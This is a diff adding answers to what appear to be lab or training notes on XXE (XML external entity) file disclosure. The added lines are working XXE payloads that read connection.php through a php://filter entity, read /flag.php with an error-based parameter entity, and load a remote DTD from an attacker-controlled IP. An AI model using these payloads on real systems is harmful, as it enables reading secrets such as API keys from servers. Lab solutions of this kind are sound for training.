@@ -60,10 +60,26 @@ done
 ## Local File Disclosure
 
 >**Q. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.**
-
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+]>
+```
 ## Advanced File Disclosure
 
 >**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**
+
+```dtd
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://10.10.15.1:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
 
 ## Blind Data Exfiltration
 
